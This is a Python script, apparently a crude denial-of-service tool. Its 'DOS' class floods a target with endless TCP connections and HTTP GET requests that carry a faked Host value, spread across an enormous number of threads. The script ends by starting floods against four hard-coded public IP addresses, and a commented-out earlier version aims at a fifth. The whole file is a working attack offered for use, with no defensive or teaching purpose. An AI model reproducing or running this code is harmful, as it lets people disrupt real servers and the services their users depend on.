import threading
import socket

#target_ip='34.141.28.239'
#port=80
#fake_ip='182.21.20.3'

#def attack():
    #while True:
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.connect((target_ip, port))
        #s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        #s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
        #s.close()


#for i in range(5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
    #t=threading.Thread(target=attack)
    #t.start()


class DOS:
    def __init__(self,target_ip,port=80,fake_ip='182.21.20.3'):
        self.target_ip=target_ip
        self.port=port
        self.fake_ip=fake_ip

    def config(self):
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_ip, self.port))
            s.sendto(("GET /" + self.target_ip + " HTTP/1.1\r\n").encode('ascii'), (self.target_ip, self.port))
            s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target_ip, self.port))
            s.close()

    def attack(self):
        for i in range(5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
            t=threading.Thread(target=self.config)
            t.start()
    
        
a=DOS(target_ip='52.5.82.174')
a.attack()

b=DOS(target_ip='54.165.58.209')
b.attack()

c=DOS(target_ip='54.159.116.102')
c.attack()

d=DOS(target_ip='18.208.60.216')
d.attack()
